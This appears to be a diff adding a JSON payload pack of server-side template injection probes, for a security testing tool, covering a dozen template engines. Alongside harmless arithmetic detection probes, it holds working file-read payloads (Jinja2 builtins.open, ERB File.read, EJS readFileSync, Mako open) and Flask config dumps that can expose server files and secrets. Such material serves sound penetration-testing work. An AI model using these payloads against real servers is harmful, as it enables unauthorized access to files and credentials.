@@ -1,0 +1,373 @@
+{
+  "pack": "builtin-ssti",
+  "category": "ssti",
+  "source": "builtin",
+  "license": "MIT",
+  "templates": [
+    {
+      "id": "ssti-jinja2-detect-mul",
+      "name": "Jinja2 arithmetic probe",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "detection",
+      "template": "{{7*7}}",
+      "expected": "49",
+      "tags": ["detection", "arithmetic"],
+      "notes": "Renders 49 if a Jinja2/Twig-style expression is evaluated."
+    },
+    {
+      "id": "ssti-jinja2-detect-strmul",
+      "name": "Jinja2 string multiplication",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "detection",
+      "template": "{{7*'7'}}",
+      "expected": "7777777",
+      "tags": ["detection"],
+      "notes": "Jinja2 yields 7777777 (string repeat); Twig yields 49. Useful to tell them apart."
+    },
+    {
+      "id": "ssti-jinja2-id-config",
+      "name": "Jinja2/Flask config object",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "identification",
+      "template": "{{config}}",
+      "tags": ["identification", "flask"],
+      "notes": "In Flask, dumps the app config mapping. Confirms Jinja2 + Flask context."
+    },
+    {
+      "id": "ssti-jinja2-id-self",
+      "name": "Jinja2 self object",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "identification",
+      "template": "{{self}}",
+      "tags": ["identification"],
+      "notes": "Renders a TemplateReference repr in Jinja2."
+    },
+    {
+      "id": "ssti-jinja2-ctx-config",
+      "name": "Jinja2 config inspection",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "context",
+      "template": "{{config.items()}}",
+      "tags": ["context", "flask"],
+      "notes": "Non-destructive: lists Flask config items if available."
+    },
+    {
+      "id": "ssti-jinja2-file-builtins",
+      "name": "Jinja2 file read via builtins.open",
+      "category": "ssti",
+      "engine": "jinja2",
+      "mode": "file-read",
+      "template": "{{get_flashed_messages.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
+      "required": ["file"],
+      "version_dependent": true,
+      "tags": ["file-read", "flask"],
+      "notes": "Environment-dependent: needs an accessible global exposing __builtins__ (Flask). Avoids fragile numeric subclass indexes."
+    },
+
+    {
+      "id": "ssti-twig-detect",
+      "name": "Twig arithmetic probe",
+      "category": "ssti",
+      "engine": "twig",
+      "mode": "detection",
+      "template": "{{7*7}}",
+      "expected": "49",
+      "tags": ["detection", "arithmetic"]
+    },
+    {
+      "id": "ssti-twig-id-strmul",
+      "name": "Twig string multiplication",
+      "category": "ssti",
+      "engine": "twig",
+      "mode": "identification",
+      "template": "{{7*'7'}}",
+      "expected": "49",
+      "tags": ["identification"],
+      "notes": "Twig coerces and yields 49 (unlike Jinja2's 7777777)."
+    },
+    {
+      "id": "ssti-twig-id-filter",
+      "name": "Twig upper filter",
+      "category": "ssti",
+      "engine": "twig",
+      "mode": "identification",
+      "template": "{{'<<POAD_MARKER>>'|upper}}",
+      "required": ["marker"],
+      "tags": ["identification"],
+      "notes": "Confirms Twig filter syntax by upper-casing the marker."
+    },
+    {
+      "id": "ssti-twig-file-source",
+      "name": "Twig source() file read",
+      "category": "ssti",
+      "engine": "twig",
+      "mode": "file-read",
+      "template": "{{source('<<POAD_FILE>>')}}",
+      "required": ["file"],
+      "version_dependent": true,
+      "tags": ["file-read"],
+      "notes": "source() returns a template file's raw contents when the loader can reach the path."
+    },
+    {
+      "id": "ssti-twig-file-include",
+      "name": "Twig include() file",
+      "category": "ssti",
+      "engine": "twig",
+      "mode": "file-read",
+      "template": "{{include('<<POAD_FILE>>')}}",
+      "required": ["file"],
+      "version_dependent": true,
+      "tags": ["file-read"],
+      "notes": "include() renders the file as a template; useful only if the loader path allows it."
+    },
+
+    {
+      "id": "ssti-freemarker-detect",
+      "name": "FreeMarker arithmetic probe",
+      "category": "ssti",
+      "engine": "freemarker",
+      "mode": "detection",
+      "template": "${7*7}",
+      "expected": "49",
+      "tags": ["detection", "arithmetic"]
+    },
+    {
+      "id": "ssti-freemarker-id-assign",
+      "name": "FreeMarker assign",
+      "category": "ssti",
+      "engine": "freemarker",
+      "mode": "identification",
+      "template": "<#assign x=7*7>${x}",
+      "expected": "49",
+      "tags": ["identification"]
+    },
+    {
+      "id": "ssti-freemarker-file-include",
+      "name": "FreeMarker include file",
+      "category": "ssti",
+      "engine": "freemarker",
+      "mode": "file-read",
+      "template": "<#include '<<POAD_FILE>>'>",
+      "required": ["file"],
+      "version_dependent": true,
+      "tags": ["file-read"],
+      "notes": "Includes the file as a template; subject to FreeMarker loader restrictions."
+    },
+
+    {
+      "id": "ssti-velocity-detect",
+      "name": "Velocity arithmetic probe",
+      "category": "ssti",
+      "engine": "velocity",
+      "mode": "detection",
+      "template": "#set($x=7*7)${x}",
+      "expected": "49",
+      "tags": ["detection", "arithmetic"]
+    },
+    {
+      "id": "ssti-velocity-id-if",
+      "name": "Velocity conditional",
+      "category": "ssti",
+      "engine": "velocity",
+      "mode": "identification",
+      "template": "#set($a=1)#if($a==1)<<POAD_MARKER>>#end",
+      "required": ["marker"],
+      "tags": ["identification"],
+      "notes": "Emits the marker only if Velocity directives are evaluated."
+    },
+
+    {
+      "id": "ssti-smarty-id-version",
+      "name": "Smarty version",
+      "category": "ssti",
+      "engine": "smarty",
+      "mode": "identification",
+      "template": "{$smarty.version}",
+      "tags": ["identification"],
+      "notes": "Prints the Smarty version string."
+    },
+    {
+      "id": "ssti-smarty-detect-math",
+      "name": "Smarty math function",
+      "category": "ssti",
+      "engine": "smarty",
+      "mode": "detection",
+      "template": "{math equation='7*7'}",
+      "expected": "49",
+      "tags": ["detection"]
+    },
+    {
+      "id": "ssti-smarty-file-fetch",
+      "name": "Smarty fetch() file",
+      "category": "ssti",
+      "engine": "smarty",
+      "mode": "file-read",
+      "template": "{fetch file='<<POAD_FILE>>'}",
+      "required": ["file"],
+      "version_dependent": true,
+      "tags": ["file-read"],
+      "notes": "fetch returns file contents when SECURITY allows local file access."
+    },
+
+    {
+      "id": "ssti-erb-detect",
+      "name": "ERB arithmetic probe",
+      "category": "ssti",
+      "engine": "erb",
+      "mode": "detection",
+      "template": "<%= 7*7 %>",
+      "expected": "49",
+      "tags": ["detection", "arithmetic"]
+    },
+    {
+      "id": "ssti-erb-id-strmul",
+      "name": "ERB string repeat",
+      "category": "ssti",
+      "engine": "erb",
+      "mode": "identification",
+      "template": "<%= 'a'*3 %>",
+      "expected": "aaa",
+      "tags": ["identification"]
+    },
+    {
+      "id": "ssti-erb-file-read",
+      "name": "ERB File.read",
+      "category": "ssti",
+      "engine": "erb",
+      "mode": "file-read",
+      "template": "<%= File.read('<<POAD_FILE>>') %>",
+      "required": ["file"],
+      "version_dependent": true,
+      "tags": ["file-read", "ruby"],
+      "notes": "Ruby ERB can read files directly if the context evaluates arbitrary Ruby."
+    },
+
+    {
+      "id": "ssti-ejs-detect",
+      "name": "EJS arithmetic probe",
+      "category": "ssti",
+      "engine": "ejs",
+      "mode": "detection",
+      "template": "<%= 7*7 %>",
+      "expected": "49",
+      "tags": ["detection", "arithmetic"]
+    },
+    {
+      "id": "ssti-ejs-id-version",
+      "name": "EJS node version",
+      "category": "ssti",
+      "engine": "ejs",
+      "mode": "identification",
+      "template": "<%= process.version %>",
+      "tags": ["identification", "node"],
+      "notes": "Prints the Node.js version if the JS context is reachable."
+    },
+    {
+      "id": "ssti-ejs-file-read",
+      "name": "EJS readFileSync",
+      "category": "ssti",
+      "engine": "ejs",
+      "mode": "file-read",
+      "template": "<%= require('fs').readFileSync('<<POAD_FILE>>') %>",
+      "required": ["file"],
+      "version_dependent": true,
+      "tags": ["file-read", "node"],
+      "notes": "Works only where require() is reachable from the template scope."
+    },
+
+    {
+      "id": "ssti-mako-detect",
+      "name": "Mako arithmetic probe",
+      "category": "ssti",
+      "engine": "mako",
+      "mode": "detection",
+      "template": "${7*7}",
+      "expected": "49",
+      "tags": ["detection", "arithmetic"]
+    },
+    {
+      "id": "ssti-mako-file-read",
+      "name": "Mako open().read()",
+      "category": "ssti",
+      "engine": "mako",
+      "mode": "file-read",
+      "template": "${open('<<POAD_FILE>>').read()}",
+      "required": ["file"],
+      "version_dependent": true,
+      "tags": ["file-read", "python"],
+      "notes": "Mako evaluates arbitrary Python expressions inside ${...}."
+    },
+
+    {
+      "id": "ssti-django-detect-add",
+      "name": "Django add filter",
+      "category": "ssti",
+      "engine": "django",
+      "mode": "detection",
+      "template": "{{7|add:7}}",
+      "expected": "14",
+      "tags": ["detection"],
+      "notes": "Django does not evaluate {{7*7}}; the add filter proves template rendering."
+    },
+    {
+      "id": "ssti-django-ctx-debug",
+      "name": "Django debug tag",
+      "category": "ssti",
+      "engine": "django",
+      "mode": "context",
+      "template": "{% debug %}",
+      "tags": ["context"],
+      "notes": "Dumps available context/variables when DEBUG is on. Django's template language is sandboxed: direct file read via template syntax is not supported."
+    },
+
+    {
+      "id": "ssti-thymeleaf-detect",
+      "name": "Thymeleaf inline arithmetic",
+      "category": "ssti",
+      "engine": "thymeleaf",
+      "mode": "detection",
+      "template": "[[${7*7}]]",
+      "expected": "49",
+      "tags": ["detection", "arithmetic"]
+    },
+    {
+      "id": "ssti-thymeleaf-id-expr",
+      "name": "Thymeleaf expression",
+      "category": "ssti",
+      "engine": "thymeleaf",
+      "mode": "identification",
+      "template": "[[${T(java.lang.System).getProperty('java.version')}]]",
+      "version_dependent": true,
+      "tags": ["identification", "spring"],
+      "notes": "Reads the JVM version via SpringEL if preprocessing expressions are evaluated."
+    },
+
+    {
+      "id": "ssti-spring-el-detect",
+      "name": "Spring EL arithmetic",
+      "category": "ssti",
+      "engine": "spring-el",
+      "mode": "detection",
+      "template": "${7*7}",
+      "expected": "49",
+      "tags": ["detection", "arithmetic"]
+    },
+
+    {
+      "id": "ssti-pug-detect",
+      "name": "Pug interpolation arithmetic",
+      "category": "ssti",
+      "engine": "pug",
+      "mode": "detection",
+      "template": "#{7*7}",
+      "expected": "49",
+      "tags": ["detection", "arithmetic"],
+      "notes": "Pug/Jade interpolation evaluates JS; RCE gadgets are environment-dependent and not shipped by default."
+    }
+  ]
+}
